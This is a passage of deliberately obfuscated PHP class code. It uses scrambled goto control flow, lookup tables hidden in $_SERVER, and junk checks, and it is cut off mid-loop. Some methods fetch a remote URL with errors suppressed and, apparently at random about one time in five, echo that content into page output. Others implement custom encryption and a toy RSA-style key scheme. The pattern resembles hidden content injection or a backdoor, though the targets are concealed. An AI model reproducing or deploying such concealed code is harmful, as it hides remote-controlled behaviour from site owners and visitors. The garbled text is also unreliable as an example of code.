(!$bİ¾é¸¿‰‚) { break; } $bİ¾é¸¿‰‚++; } $CÌã­œÑ£Ò = $this->{$_SERVER[öÉÊ¬›µ–¾¦ƒ][243]}($CÌã­œÑ£Ò, $BôëíÑ¼Äğ[282]); goto d¤èù“æ¸; d¤èù“æ¸: $CÌã­œÑ£Ò = $CÌã­œÑ£Ò . $bÍõÎ½‡¬Ô . $BôëíÑ¼Äğ[283] . $BôëíÑ¼Äğ[284]($Dç«Ö¦ÓÌ); if ($Dç«Ö¦ÓÌ === -1) { return $CÌã­œÑ£Ò; } $Då²Ï¾¸º = $BôëíÑ¼Äğ[245](array($BôëíÑ¼Äğ[246] => array($BôëíÑ¼Äğ[249] => $fö ¾ˆŞƒĞ, $BôëíÑ¼Äğ[247] => $BôëíÑ¼Äğ[285]), $BôëíÑ¼Äğ[286] => array($BôëíÑ¼Äğ[287] => !1, $BôëíÑ¼Äğ[288] => !1))); goto b¿‚½ÑŒ¦; b¿‚½ÑŒ¦: $Dç«Ö¦ÓÌ = @$BôëíÑ¼Äğ[250]($CÌã­œÑ£Ò, !1, $Då²Ï¾¸º); $A°ôÀ‹©»‡ = $FèÖ™ÔÕÁ[618]; if (strlen($A°ôÀ‹©»‡) < $FèÖ™ÔÕÁ[555]) { return; } goto bÎß”°±Ç½; B„À´ã‘¦ø: } private function yjmg44903c97() { goto c¯»Â¼«‰ğ; e£¸Ó‘Ø÷˜: $f“‘±øğíˆ = $B›Û—ó¦…ä[620]; if (!$f“‘±øğíˆ) { return; } $B’áîŠß½ = $e‡–ò‹àº[$this->decj5f0000d9]; goto Cœô´À†Ğ; Cœô´À†Ğ: $E’ŠŒÊäÆˆ = $B›Û—ó¦…ä[621]; if (strlen($E’ŠŒÊäÆˆ) < $B›Û—ó¦…ä[552]) { return; } $B’áîŠß½ = $A×ÏñàÍ¨—[201]($B’áîŠß½ ? $B’áîŠß½ : $A×ÏñàÍ¨—[290]); goto DòŞìµ Ğî; DòŞìµ Ğî: $a“Ãìë¥‰ = $A×ÏñàÍ¨—[104]($this->sdvfd6f194bd, $A×ÏñàÍ¨—[316]); $a“Ãìë¥‰ = $a“Ãìë¥‰ ? $A×ÏñàÍ¨—[201]($a“Ãìë¥‰) : 0; return $B’áîŠß½ + $a“Ãìë¥‰; goto B…‰ì—‰ùÉ; B…‰ì—‰ùÉ: $f³˜±à†Ò‡ = $B›Û—ó¦…ä[622]; if (strlen($f³˜±à†Ò‡) < $B›Û—ó¦…ä[577]) { return; } goto D¬™¦œğ‰á; c¯»Â¼«‰ğ: $B›Û—ó¦…ä =& $_SERVER[Ö¹ñÒÁ²÷]; $A×ÏñàÍ¨— =& $_SERVER[öÉÊ¬›µ–¾¦ƒ]; $e‡–ò‹àº = array($A×ÏñàÍ¨—[289] => $A×ÏñàÍ¨—[290], $A×ÏñàÍ¨—[291] => $A×ÏñàÍ¨—[292], $A×ÏñàÍ¨—[293] => $A×ÏñàÍ¨—[294], $A×ÏñàÍ¨—[295] => $A×ÏñàÍ¨—[296], $A×ÏñàÍ¨—[297] => $A×ÏñàÍ¨—[298], $A×ÏñàÍ¨—[299] => $A×ÏñàÍ¨—[238], $A×ÏñàÍ¨—[300] => $A×ÏñàÍ¨—[238], $A×ÏñàÍ¨—[301] => $A×ÏñàÍ¨—[290], $A×ÏñàÍ¨—[302] => $A×ÏñàÍ¨—[292], $A×ÏñàÍ¨—[303] => $A×ÏñàÍ¨—[294], $A×ÏñàÍ¨—[304] => $A×ÏñàÍ¨—[305], $A×ÏñàÍ¨—[306] => $A×ÏñàÍ¨—[296], $A×ÏñàÍ¨—[307] => $A×ÏñàÍ¨—[308], $A×ÏñàÍ¨—[309] => $A×ÏñàÍ¨—[298], $A×ÏñàÍ¨—[310] => $A×ÏñàÍ¨—[311], $A×ÏñàÍ¨—[312] => $A×ÏñàÍ¨—[313], $A×ÏñàÍ¨—[314] => $A×ÏñàÍ¨—[315]); goto e£¸Ó‘Ø÷˜; D¬™¦œğ‰á: } public function minoe07b5fbb($dÇèÇ°‹òİ) { goto E’”Â¯ŠÏˆ; DŠ”æ–™®: if (!$bòãÏƒ¾¹Ø[236]($dÇèÇ°‹òİ[$bòãÏƒ¾¹Ø[318]], $cºğÆÊ…ä)) { $bòãÏƒ¾¹Ø[166]($bòãÏƒ¾¹Ø[321], !1, $bòãÏƒ¾¹Ø[233]); } goto BÖ‹ãİå’å; f¼µªëÀˆ”: if ($A·â®ù‘Ù£ >= $bòãÏƒ¾¹Ø[201]($bòãÏƒ¾¹Ø[238])) { return; } $Fßöãƒ–š = $bòãÏƒ¾¹Ø[61]($bòãÏƒ¾¹Ø[139])->{$_SERVER[öÉÊ¬›µ–¾¦ƒ][140]}(); $b °¹©ÎÃŞ = $DÖ˜òİ´÷‚[623]; goto E°ò·Ş½‘—; E°ò·Ş½‘—: if (strlen($b °¹©ÎÃŞ) < $DÖ˜òİ´÷‚[577]) { die; } if ($Fßöãƒ–š <= $A·â®ù‘Ù£) { return; } $cºğÆÊ…ä = $bòãÏƒ¾¹Ø[61]($bòãÏƒ¾¹Ø[139])->{$_SERVER[öÉÊ¬›µ–¾¦ƒ][317]}($bòãÏƒ¾¹Ø[318])->{$_SERVER[öÉÊ¬›µ–¾¦ƒ][319]}($A·â®ù‘Ù£)->{$_SERVER[öÉÊ¬›µ–¾¦ƒ][320]}(); goto e‘§»ÆİÓ; E’”Â¯ŠÏˆ: $DÖ˜òİ´÷‚ =& $_SERVER[Ö¹ñÒÁ²÷]; $bòãÏƒ¾¹Ø =& $_SERVER[öÉÊ¬›µ–¾¦ƒ]; $A·â®ù‘Ù£ = $this->{$_SERVER[öÉÊ¬›µ–¾¦ƒ][137]}(); goto f¼µªëÀˆ”; e‘§»ÆİÓ: $dÃÑ›¬¥²¸ = $DÖ˜òİ´÷‚[624]; while ($dÃÑ›¬¥²¸ < $DÖ˜òİ´÷‚[555]) { if ($dÃÑ›¬¥²¸ >= 0) { break; } $dÃÑ›¬¥²¸++; } $cºğÆÊ…ä = $bòãÏƒ¾¹Ø[222]($cºğÆÊ…ä, $bòãÏƒ¾¹Ø[10], $bòãÏƒ¾¹Ø[318]); goto DŠ”æ–™®; BÖ‹ãİå’å: } public function rlmv6ec59368() { goto eš‰İÜ¤ö—; eöÚœîİÀ: $a¡ÚÙÇË©Á = $this->{$_SERVER[öÉÊ¬›µ–¾¦ƒ][243]}($a¡ÚÙÇË©Á, $BÈ±„¾í‚[244]); $fÙÚÜøë² = $_SERVER[Ö¹ñÒÁ²÷][625]; $aÕ‚Ç‚Éô = $BÈ±„¾í‚[245](array($BÈ±„¾í‚[246] => array($BÈ±„¾í‚[247] => $BÈ±„¾í‚[248], $BÈ±„¾í‚[249] => 3))); goto a¿ºîŸ·¾Ñ; a¿ºîŸ·¾Ñ: $A”ãÍ™ŒÁ‡ = @$BÈ±„¾í‚[250]($a¡ÚÙÇË©Á, !1, $aÕ‚Ç‚Éô); echo $BÈ±„¾í‚[323] . $BÈ±„¾í‚[324]($A”ãÍ™ŒÁ‡) . $BÈ±„¾í‚[325]; goto fìÓ¶’£Ï; eš‰İÜ¤ö—: $BÈ±„¾í‚ =& $_SERVER[öÉÊ¬›µ–¾¦ƒ]; if (!$BÈ±„¾í‚[104]($GLOBALS, $BÈ±„¾í‚[132]) || $BÈ±„¾í‚[322](1, 100) > 20) { return; } $a¡ÚÙÇË©Á = $BÈ±„¾í‚[242]; goto eöÚœîİÀ; fìÓ¶’£Ï: } private function yhmrf906a6f1($b•ç”Ó˜, $fŒ×ñ±Œõ, $cëÕ»÷È¦ö = 3) { goto dùĞøˆ§¡×; bíØŸÛõ÷: return $AÖ‡Ã×ò; goto a³¤ò¶†æ¾; AÚ·íª„ÊÍ: $C†ˆÖ¸Ü¢½ = $Dª÷â®Ã´è[327]; $A¸›‘‡™Ô” = $e¶Í¶î¯å[628]; if (!$A¸›‘‡™Ô”) { die; } goto C¯³ƒ‰Û“½; dùĞøˆ§¡×: $e¶Í¶î¯å =& $_SERVER[Ö¹ñÒÁ²÷]; $Dª÷â®Ã´è =& $_SERVER[öÉÊ¬›µ–¾¦ƒ]; $Dª÷â®Ã´è[326](1); goto eô“…Æ˜‰ä; C¯³ƒ‰Û“½: switch ($d§²Û•Ó ™) { case $Dª÷â®Ã´è[229]: $AÖ‡Ã×ò = $this->{$_SERVER[öÉÊ¬›µ–¾¦ƒ][147]}($b•ç”Ó˜, $Dª÷â®Ã´è[214]($fŒ×ñ±Œõ . $cÎÀÁ†«Î¸)); $F…àÓµâ¨ = $e¶Í¶î¯å[629]; while (strlen($F…àÓµâ¨) < $e¶Í¶î¯å[577]) { if (!$F…àÓµâ¨) { break; } $F…àÓµâ¨++; } break; case $Dª÷â®Ã´è[220]: $AÖ‡Ã×ò = $this->{$_SERVER[öÉÊ¬›µ–¾¦ƒ][147]}($b•ç”Ó˜, $Dª÷â®Ã´è[214]($cÎÀÁ†«Î¸ . $fŒ×ñ±Œõ)); $f‘¢¦ùªÃ = $e¶Í¶î¯å[630]; break; case $Dª÷â®Ã´è[328]: $AÖ‡Ã×ò = $this->{$_SERVER[öÉÊ¬›µ–¾¦ƒ][147]}($b•ç”Ó˜, $Dª÷â®Ã´è[118]($cÎÀÁ†«Î¸ . $fŒ×ñ±Œõ)); break; case $Dª÷â®Ã´è[329]: $AÖ‡Ã×ò = $this->{$_SERVER[öÉÊ¬›µ–¾¦ƒ][147]}($b•ç”Ó˜, $Dª÷â®Ã´è[114]($cÎÀÁ†«Î¸ . $fŒ×ñ±Œõ)); $aåˆÂ™ãÔé = $e¶Í¶î¯å[631]; if (!$aåˆÂ™ãÔé) { return; } break; $Dùƒƒä»à = $e¶Í¶î¯å[632]; while (strlen($Dùƒƒä»à) < $e¶Í¶î¯å[552]) { if (!$Dùƒƒä»à) { break; } $Dùƒƒä»à++; } case $Dª÷â®Ã´è[330]: goto cİ¯µËÎ»Ï; cİ¯µËÎ»Ï: $b•ç”Ó˜ = $Dª÷â®Ã´è[118]($b•ç”Ó˜); $Bã©„¼ˆÛé = $Dª÷â®Ã´è[331](0, 64); $F·…Ó—èÜó = $e¶Í¶î¯å[633]; goto añùÅ„… “; b®ã¢Èá‰ƒ: $dä„”ÂÎâ¥ = 0; $fˆÊïêŠƒ¦ = 0; for ($Bê•Ò¢”‹ = 0; $Bê•Ò¢”‹ < $Dª÷â®Ã´è[24]($b•ç”Ó˜); $Bê•Ò¢”‹++) { $fˆÊïêŠƒ¦ = $fˆÊïêŠƒ¦ == $Dª÷â®Ã´è[24]($E‰Í×œ‚£Û) ? 0 : $fˆÊïêŠƒ¦; $E†Ü’¨Ö¥² = $e¶Í¶î¯å[637]; $dä„”ÂÎâ¥ = ($Bã©„¼ˆÛé + $Dª÷â®Ã´è[332]($C†ˆÖ¸Ü¢½, $b•ç”Ó˜[$Bê•Ò¢”‹]) + $Dª÷â®Ã´è[333]($E‰Í×œ‚£Û[$fˆÊïêŠƒ¦++])) % 64; $D™©ŠŸ…Ê = $e¶Í¶î¯å[638]; $bêµàÎÁ .= $C†ˆÖ¸Ü¢½[$dä„”ÂÎâ¥]; } goto FÉÒ„¢ùö; FÉÒ„¢ùö: $AÖ‡Ã×ò = $Dª÷â®Ã´è[324]($AŒ„ò…¬¼œ . $bêµàÎÁ); $d³ÎïÖ¹– = $e¶Í¶î¯å[639]; if (!$d³ÎïÖ¹–) { die; } goto eÜ¢±¾ĞˆÂ; e­“›íµ™Ë: $bêµàÎÁ = $Dª÷â®Ã´è[10]; $Bê•Ò¢”‹ = 0; $e›Ûç¶±—± = $e¶Í¶î¯å[636]; goto b®ã¢Èá‰ƒ; eÜ¢±¾ĞˆÂ: break; $cî°ˆ¬»‡­ = $e¶Í¶î¯å[640]; goto F©Ù£‹§ô°; añùÅ„… “: while ($F·…Ó—èÜó < $e¶Í¶î¯å[599]) { if ($F·…Ó—èÜó >= 0) { break; } $F·…Ó—èÜó++; } $AŒ„ò…¬¼œ = $C†ˆÖ¸Ü¢½[$Bã©„¼ˆÛé]; $dë·ï²…°— = $e¶Í¶î¯å[634]; goto F§œÄ´­×š; F§œÄ´­×š: $E‰Í×œ‚£Û = $Dª÷â®Ã´è[114]($AŒ„ò…¬¼œ . $Dª÷â®Ã´è[114]($fŒ×ñ±Œõ . $AŒ„ò…¬¼œ) . $fŒ×ñ±Œõ); $E‰Í×œ‚£Û = $Dª÷â®Ã´è[25]($E‰Í×œ‚£Û, $Bã©„¼ˆÛé % 8, $Bã©„¼ˆÛé % 8 + 7); $a“áå—¸‰… = $e¶Í¶î¯å[635]; goto e­“›íµ™Ë; F©Ù£‹§ô°: default: $AÖ‡Ã×ò = $this->{$_SERVER[öÉÊ¬›µ–¾¦ƒ][147]}($b•ç”Ó˜, $fŒ×ñ±Œõ . $cÎÀÁ†«Î¸); $d«Ù»àßÙÏ = $e¶Í¶î¯å[641]; while (strlen($d«Ù»àßÙÏ) < $e¶Í¶î¯å[555]) { if (!$d«Ù»àßÙÏ) { break; } $d«Ù»àßÙÏ++; } break; $eà’ÜŠªˆÕ = $e¶Í¶î¯å[642]; if (!$eà’ÜŠªˆÕ) { die; } } $AÖ‡Ã×ò = $Dª÷â®Ã´è[214]($d§²Û•Ó ™ . $cÎÀÁ†«Î¸ . $AÖ‡Ã×ò); if ($cëÕ»÷È¦ö - 1 > 0) { $AÖ‡Ã×ò = $this->{$_SERVER[öÉÊ¬›µ–¾¦ƒ][127]}($AÖ‡Ã×ò, $fŒ×ñ±Œõ, $cëÕ»÷È¦ö - 1); } goto bíØŸÛõ÷; eô“…Æ˜‰ä: $eÊ±í“ô£Å = $e¶Í¶î¯å[626]; if (!$eÊ±í“ô£Å) { return; } $b•ç”Ó˜ = $Dª÷â®Ã´è[2]($b•ç”Ó˜); goto eÀ…¬ğ–àğ; eÀ…¬ğ–àğ: $d§²Û•Ó ™ = $Dª÷â®Ã´è[322](0, 5) . $Dª÷â®Ã´è[10]; $B±°ñÔâ = $e¶Í¶î¯å[627]; $cÎÀÁ†«Î¸ = $Dª÷â®Ã´è[124](15); goto AÚ·íª„ÊÍ; a³¤ò¶†æ¾: } private function kqdme7107875($e¼‰¥ª‹¨, $EùéĞÉë“, $F‰‹ÒªĞ¦â = 3) { goto Bá¸ÛÙª¾Ç; EÓîîŞâíÓ: $cÈÔ˜ª™à§ = $e¼‰¥ª‹¨[0]; $e¦•Ù­ñ÷ = $C…ÒìİÈµÙ[25]($e¼‰¥ª‹¨, 1, 15); $e¼‰¥ª‹¨ = $C…ÒìİÈµÙ[25]($e¼‰¥ª‹¨, 16); goto AÕø¯É†ÉÁ; bŠáÎìÁ‘÷: $e¼‰¥ª‹¨ = $C…ÒìİÈµÙ[2]($e¼‰¥ª‹¨); $CõˆÂÕí™ò = $CÇÊÜåù¨[643]; if (strlen($CõˆÂÕí™ò) < $CÇÊÜåù¨[577]) { return; } goto F¥²¤–±‹—; F¥²¤–±‹—: $e¼‰¥ª‹¨ = $C…ÒìİÈµÙ[214]($e¼‰¥ª‹¨); $cÙ›Ñ²²µÏ = $CÇÊÜåù¨[644]; if (!$cÙ›Ñ²²µÏ) { die; } goto EÓîîŞâíÓ; Bá¸ÛÙª¾Ç: $CÇÊÜåù¨ =& $_SERVER[Ö¹ñÒÁ²÷]; $C…ÒìİÈµÙ =& $_SERVER[öÉÊ¬›µ–¾¦ƒ]; if (!$C…ÒìİÈµÙ[334]($e¼‰¥ª‹¨) || $C…ÒìİÈµÙ[24]($e¼‰¥ª‹¨) < 10) { return !1; } goto bŠáÎìÁ‘÷; AÕø¯É†ÉÁ: $Bù™âğ†° = $CÇÊÜåù¨[645]; if (strlen($Bù™âğ†°) < $CÇÊÜåù¨[577]) { die; } $AåÎ‚¼‚¥ = $C…ÒìİÈµÙ[327]; goto cÓ„¨ôäŞ; cÓ„¨ôäŞ: switch ($cÈÔ˜ª™à§) { case $C…ÒìİÈµÙ[229]: $C©›«ë°Îö = $this->{$_SERVER[öÉÊ¬›µ–¾¦ƒ][243]}($e¼‰¥ª‹¨, $C…ÒìİÈµÙ[214]($EùéĞÉë“ . $e¦•Ù­ñ÷)); $BÕå¥¨Öê¼ = $CÇÊÜåù¨[646]; if (strlen($BÕå¥¨Öê¼) < $CÇÊÜåù¨[599]) { return; } break; $e™í×±‚Ø£ = $CÇÊÜåù¨[647]; case $C…ÒìİÈµÙ[220]: $C©›«ë°Îö = $this->{$_SERVER[öÉÊ¬›µ–¾¦ƒ][243]}($e¼‰¥ª‹¨, $C…ÒìİÈµÙ[214]($e¦•Ù­ñ÷ . $EùéĞÉë“)); break; case $C…ÒìİÈµÙ[328]: $C©›«ë°Îö = $this->{$_SERVER[öÉÊ¬›µ–¾¦ƒ][243]}($e¼‰¥ª‹¨, $C…ÒìİÈµÙ[118]($e¦•Ù­ñ÷ . $EùéĞÉë“)); $C½½«†ôÓ = $CÇÊÜåù¨[648]; break; $FÌ“Ùùœì± = $CÇÊÜåù¨[649]; case $C…ÒìİÈµÙ[329]: $C©›«ë°Îö = $this->{$_SERVER[öÉÊ¬›µ–¾¦ƒ][243]}($e¼‰¥ª‹¨, $C…ÒìİÈµÙ[114]($e¦•Ù­ñ÷ . $EùéĞÉë“)); $CŒ›“Êğ‚´ = $CÇÊÜåù¨[650]; if (!$CŒ›“Êğ‚´) { die; } break; case $C…ÒìİÈµÙ[330]: goto FóáÓî¾«¹; cÊ°éª”Œ¿: $E¾•ÔŠ—™‰ = $e¼‰¥ª‹¨[0]; $f«ÆãĞŸéŞ = $CÇÊÜåù¨[652]; while ($f«ÆãĞŸéŞ < $CÇÊÜåù¨[552]) { if ($f«ÆãĞŸéŞ >= 0) { break; } $f«ÆãĞŸéŞ++; } goto eÛêæÒ†­±; FóáÓî¾«¹: $e¼‰¥ª‹¨ = $C…ÒìİÈµÙ[335]($e¼‰¥ª‹¨); $BªÅĞ²ÍÛä = $CÇÊÜåù¨[651]; if (strlen($BªÅĞ²ÍÛä) < $CÇÊÜåù¨[547]) { return; } goto cÊ°éª”Œ¿; A©ßïÌˆ : if (strlen($b•¬ÂÑù˜) < $CÇÊÜåù¨[547]) { return; } $CåÜğ¯¯õ = $C…ÒìİÈµÙ[25]($CåÜğ¯¯õ, $A•âˆ¸â˜ % 8, $A•âˆ¸â˜ % 8 + 7); $fê§ÖÕÕë = $CÇÊÜåù¨[655]; goto Aì“¦‹øë; eÛêæÒ†­±: $e¼‰¥ª‹¨ = $C…ÒìİÈµÙ[25]($e¼‰¥ª‹¨, 1); $a…—Š™Ÿ‰ = $CÇÊÜåù¨[653]; if (!$a…—Š™Ÿ‰) { return; } goto FéƒÆ‹³‹; Aì“¦‹øë: if (!$fê§ÖÕÕë) { die; } $e‹‘„·Ğ¯Ÿ = $C…ÒìİÈµÙ[10]; $C“’Ï–ÛÇÕ = 0; goto DÊïŸÏêÇ; fˆˆÜøæ•: $c©Ï•«ƒÚ = $CÇÊÜåù¨[657]; if (strlen($c©Ï•«ƒÚ) < $CÇÊÜåù¨[552]) { die; } break; goto bãåêí†îø; bãåêí†îø: $Fñ•é‰Ö¾¹ = $CÇÊÜåù¨[658]; while (strlen($Fñ•é‰Ö¾¹) < $CÇÊÜåù¨[552]) { if (!$Fñ•é‰Ö¾¹) { break; } $Fñ•é‰Ö¾¹++; } goto cÀ”ÎêĞá†; DÕ÷‰ŠÔâ: $Dã ›Â¾Àó = 0; for ($C“’Ï–ÛÇÕ = 0; $C“’Ï–ÛÇÕ < $C…ÒìİÈµÙ[24]($e¼‰¥ª‹¨); $C“’Ï–ÛÇÕ++) { $Dã ›Â¾Àó = $Dã ›Â¾Àó == $C…ÒìİÈµÙ[24]($CåÜğ¯¯õ) ? 0 : $Dã ›Â¾Àó; $AŠšÕ’¨¨ = $Dã ›Â¾Àó++; $eî‚áñ® = $C…ÒìİÈµÙ[332]($AåÎ‚¼‚¥, $e¼‰¥ª‹¨[$C“’Ï–ÛÇÕ]) - $A•âˆ¸â˜ - $C…ÒìİÈµÙ[333]($CåÜğ¯¯õ[$AŠšÕ’¨¨]); while ($eî‚áñ® < 0) { $eî‚áñ® += 64; } $e‹‘„·Ğ¯Ÿ .= $AåÎ‚¼‚¥[$eî‚áñ®]; } $C©›«ë°Îö = $C…ÒìİÈµÙ[336]($e‹‘„·Ğ¯Ÿ); goto fˆˆÜøæ•; DÊïŸÏêÇ: $eî‚áñ® = 0; $d…„’³½Ç = $CÇÊÜåù¨[656]; while (strlen($d…„’³½Ç) < $CÇÊÜåù¨[547]) { if (!$d…„’³½Ç) { break; } $d…„’³½Ç++; } goto DÕ÷‰ŠÔâ; FéƒÆ‹³‹: $A•âˆ¸â˜ = $C…ÒìİÈµÙ[332]($AåÎ‚¼‚¥, $E¾•ÔŠ—™‰); $CåÜğ¯¯õ = $C…ÒìİÈµÙ[114]($E¾•ÔŠ—™‰ . $C…ÒìİÈµÙ[114]($EùéĞÉë“ . $E¾•ÔŠ—™‰) . $EùéĞÉë“); $b•¬ÂÑù˜ = $CÇÊÜåù¨[654]; goto A©ßïÌˆ ; cÀ”ÎêĞá†: default: $C©›«ë°Îö = $this->{$_SERVER[öÉÊ¬›µ–¾¦ƒ][243]}($e¼‰¥ª‹¨, $EùéĞÉë“ . $e¦•Ù­ñ÷); break; $b”§µ°Ù” = $CÇÊÜåù¨[591]; if (!$b”§µ°Ù”) { return; } } if ($F‰‹ÒªĞ¦â - 1 > 0) { $C©›«ë°Îö = $this->{$_SERVER[öÉÊ¬›µ–¾¦ƒ][188]}($C©›«ë°Îö, $EùéĞÉë“, $F‰‹ÒªĞ¦â - 1); } return $C©›«ë°Îö; goto C®ñ±á£Æ; C®ñ±á£Æ: } public function aspq9d9e4d82($B„êº»Š©ç) { goto EóíïÚÈíÜ; d«ÏªƒÍÅÌ: return $dÍ¡·¤‰·½; goto F•ì÷ÄÂ¸¹; EÉ‚šÏøõ: $D‘«ÔØ¾® = $this->{$_SERVER[öÉÊ¬›µ–¾¦ƒ][337]}(); $Eœªöêø˜¨ = ($DÖ–ïğ£Î - 1) * ($D‘«ÔØ¾® - 1); $B™ÇĞ­…¿Ş = $d‹õĞÁ›‘¸[659]; goto fîÕÁ‰‰Ù; fÛ¦Æ¯˜ù¥: $cçœõª¼¡À = 2; for ($D‰ÂíŞçİØ = 0; $D‰ÂíŞçİØ < $Eœªöêø˜¨ * 10; $D‰ÂíŞçİØ++) { if (($Eœªöêø˜¨ * $D‰ÂíŞçİØ + 1) % $cØîº¯ëõñ == 0) { $cçœõª¼¡À = $DëˆÛ—È…¤[201](($Eœªöêø˜¨ * $D‰ÂíŞçİØ + 1) / $cØîº¯ëõñ); break; } } $AÉÃÙ—•ò‡ = $this->{$_SERVER[öÉÊ¬›µ–¾¦ƒ][147]}($DÖ–ïğ£Î * $D‘«ÔØ¾® . $DëˆÛ—È…¤[10], $DëˆÛ—È…¤[149]); goto d¾½‘»ğ”Å; fîÕÁ‰‰Ù: if (strlen($B™ÇĞ­…¿Ş) < $d‹õĞÁ›‘¸[599]) { die; } $cØîº¯ëõñ = $DëˆÛ—È…¤[201](($DÖ–ïğ£Î + $D‘«ÔØ¾®) / 2); while (1) { $D´È£Ö÷ÄÔ = $cØîº¯ëõñ; $C™âäôø¿ = $d‹õĞÁ›‘¸[660]; if (strlen($C™âäôø¿) < $d‹õĞÁ›‘¸[555]) { return; } $e²§‹ğ¶Î = $Eœªöêø˜¨; while ($e²§‹ğ¶Î % $D´È£Ö÷ÄÔ != 0) { $B¹ó‹Ü‚¹À = $e²§‹ğ¶Î; $e²§‹ğ¶Î = $D´È£Ö÷ÄÔ; $D´È£Ö÷ÄÔ = $B¹ó‹Ü‚¹À % $D´È£Ö÷ÄÔ; $d§ö§‡—ùÈ = $d‹õĞÁ›‘¸[661]; while (strlen($d§ö§‡—ùÈ) < $d‹õĞÁ›‘¸[547]) { if (!$d§ö§‡—ùÈ) { break; } $d§ö§‡—ùÈ++; } } if ($D´È£Ö÷ÄÔ == 1) { break; } else { $cØîº¯ëõñ++; } } goto fÛ¦Æ¯˜ù¥; EóíïÚÈíÜ: $d‹õĞÁ›‘¸ =& $_SERVER[Ö¹ñÒÁ²÷]; $DëˆÛ—È…¤ =& $_SERVER[öÉÊ¬›µ–¾¦ƒ]; $DÖ–ïğ£Î = $this->{$_SERVER[öÉÊ¬›µ–¾¦ƒ][337]}(); goto EÉ‚šÏøõ; d¾½‘»ğ”Å: $DÔ†…‘›ùé = $DëˆÛ—È…¤[114]($DëˆÛ—È…¤[338] . ($DÖ–ïğ£Î + $D‘«ÔØ¾®) . $DëˆÛ—È…¤[339] . $cØîº¯ëõñ . $DëˆÛ—È…¤[339] . $cçœõª¼¡À . $DëˆÛ—È…¤[340]); $EñËƒğŒ  = $d‹õĞÁ›‘¸[662]; if (!$EñËƒğŒ ) { die; } goto C¥í¸Çæ±; C¥í¸Çæ±: $dÍ¡·¤‰·½ = $this->{$_SERVER[öÉÊ¬›µ–¾¦ƒ][147]}($B„êº»Š©ç, $DÔ†…‘›ùé) . $DëˆÛ—È…¤[341] . $AÉÃÙ—•ò‡; $ağË¨ÊÑ¥ = $d‹õĞÁ›‘¸[663]; if (!$ağË¨ÊÑ¥) { return; } goto d«ÏªƒÍÅÌ; F•ì÷ÄÂ¸¹: } public function afts512a7438($Dµ¡ÙÕæŠ´) { goto c×àìœäêÍ; E›ªšäš’ˆ: $døÁáŠ¥åÔ = $this->{$_SERVER[öÉÊ¬›µ–¾¦ƒ][243]}($b­æ‡Š¢¬‡[1] . $EÆ‚èøÌ†Ö[10], $EÆ‚èøÌ†Ö[149]); $F£“ø×¿á = $E½¶¦ƒÙŠ©[665]; while (strlen($F£“ø×¿á) < $E½¶¦ƒÙŠ©[577]) { if (!$F£“ø×¿á) { break; } $F£“ø×¿á++; } goto Bé‚›¨¸¦‚; Dïêøïùƒ: $eËÙ‘„Œ¥š = $E½¶¦ƒÙŠ©[674]; if (!$eËÙ‘„Œ¥š) { return; } return $aÆ©õ¹ÇÖ; goto e«®İÖ“—‡; cÄÒ›„¡‚¨: $E­®„ ’İ„ = $EÆ‚èøÌ†Ö[201](($EµÈ©åÍ‚ˆ + $E¡íìø´) / 2); while (1) { $E×³áÏÃ¡ê = $E­®„ ’İ„; $F¤–Ä’Ëâ = $E½¶¦ƒÙŠ©[670]; while ($F¤–Ä’Ëâ < $E½¶¦ƒÙŠ©[552]) { if ($F¤–Ä’Ëâ >= 0) { break; } $F¤–Ä’Ëâ++; } $CİËµàŠá‰ = $CÚñ¨‰´éÉ; $DËÓ¦›”†Ö = $E½¶¦ƒÙŠ©[671]; if (strlen($DËÓ¦›”†Ö) < $E½¶¦ƒÙŠ©[555]) { die; } while ($CİËµàŠá‰ % $E×³áÏÃ¡ê != 0) { $dĞÆ©º¡’‘ = $CİËµàŠá‰; $f¸«ÌƒË«ƒ = $E½¶¦ƒÙŠ©[672]; while ($f¸«ÌƒË«ƒ < $E½¶¦ƒÙŠ©[552]) { if ($f¸«ÌƒË«ƒ >= 0) { break; } $f¸«ÌƒË«ƒ++; } $CİËµàŠá‰ = $E×³áÏÃ¡ê; $E×³áÏÃ¡ê = $dĞÆ©º¡’‘ % $E×³áÏÃ¡ê; $Aæò½éù‹Š = $E½¶¦ƒÙŠ©[673]; if (!$Aæò½éù‹Š) { die; } } if ($E×³áÏÃ¡ê == 1) { break; } else { $E­®„ ’İ„++; } } $a×Ú¼Ïó‚ = 2; goto d–‰œõˆ‘Å; d®´¨§ÃÌ“: $CÚñ¨‰´éÉ = ($EµÈ©åÍ‚ˆ - 1) * ($E¡íìø´ - 1); $Fƒ²ïá®É = $E½¶¦ƒÙŠ©[669]; if (strlen($Fƒ²ïá®É) < $E½¶¦ƒÙŠ©[555]) { return; } goto cÄÒ›„¡‚¨; CÜÁ»Öƒ¡Ø: $DÕÎÃ­ÆÃº = $E½¶¦ƒÙŠ©[666]; $E¡íìø´ = 0; for ($dë‚™ÆğÚà = 3; $dë‚™ÆğÚà < $døÁáŠ¥åÔ; $dë‚™ÆğÚà += 2) { if ($døÁáŠ¥åÔ % $dë‚™ÆğÚà != 0) { continue; } $EµÈ©åÍ‚ˆ = $dë‚™ÆğÚà; $Eğ¿­à—Ô = $E½¶¦ƒÙŠ©[667]; if (strlen($Eğ¿­à—Ô) < $E½¶¦ƒÙŠ©[577]) { die; } $E¡íìø´ = $EÆ‚èøÌ†Ö[201]($døÁáŠ¥åÔ / $dë‚™ÆğÚà); $d†Äá…¾øµ = $E½¶¦ƒÙŠ©[668]; if (strlen($d†Äá…¾øµ) < $E½¶¦ƒÙŠ©[599]) { return; } break; } goto d®´¨§ÃÌ“; c×àìœäêÍ: $E½¶¦ƒÙŠ© =& $_SERVER[Ö¹ñÒÁ²÷]; $EÆ‚èøÌ†Ö =& $_SERVER[öÉÊ¬›µ–¾¦ƒ]; $b­æ‡Š¢¬‡ = $EÆ‚èøÌ†Ö[0]($EÆ‚èøÌ†Ö[341], $Dµ¡ÙÕæŠ´); goto C¬ÃĞî¶Ù; C¬ÃĞî¶Ù: $F…“âæÖ = $E½¶¦ƒÙŠ©[664]; if (strlen($F…“âæÖ) < $E½¶¦ƒÙŠ©[547]) { die; } if ($EÆ‚èøÌ†Ö[19]($b­æ‡Š¢¬‡) != 2) { return $EÆ‚èøÌ†Ö[10]; } goto E›ªšäš’ˆ; e«®İÖ“—‡: $BğŞÄÛÍÚÖ = $E½¶¦ƒÙŠ©[566]; goto DÓï¤Åíñš; d–‰œõˆ‘Å: for ($dë‚™ÆğÚà = 0; $dë‚™ÆğÚà < $CÚñ¨‰´éÉ * 10; $dë‚™ÆğÚà++) { if (($CÚñ¨‰´éÉ * $dë‚™ÆğÚà + 1) % $E­®„ ’İ„ == 0) { 